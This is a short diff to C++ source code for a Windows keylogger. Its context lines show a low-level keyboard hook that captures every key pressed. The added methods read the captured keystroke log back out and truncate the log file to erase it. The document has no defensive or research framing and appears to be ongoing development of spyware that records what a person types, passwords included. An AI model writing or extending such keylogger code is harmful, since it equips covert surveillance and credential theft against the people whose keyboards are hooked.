@@ -54,6 +54,31 @@ void KeyLogger::stop() {
     }
 }
 
+// Reads and returns the contents of the key log file
+std::string KeyLogger::getLoggedData() {
+    std::ifstream inFile(filePath);
+    if (!inFile.is_open()) {
+        return "";
+    }
+    
+    std::string content;
+    std::string line;
+    while (std::getline(inFile, line)) {
+        content += line + "\n";
+    }
+    inFile.close();
+    
+    return content;
+}
+
+// Clears/erases the contents of the key log file
+void KeyLogger::clearLogFile() {
+    std::ofstream clearFile(filePath, std::ios::trunc);
+    if (clearFile.is_open()) {
+        clearFile.close();
+    }
+}
+
 // Low-level keyboard hook procedure for capturing keystrokes
 LRESULT CALLBACK KeyLogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
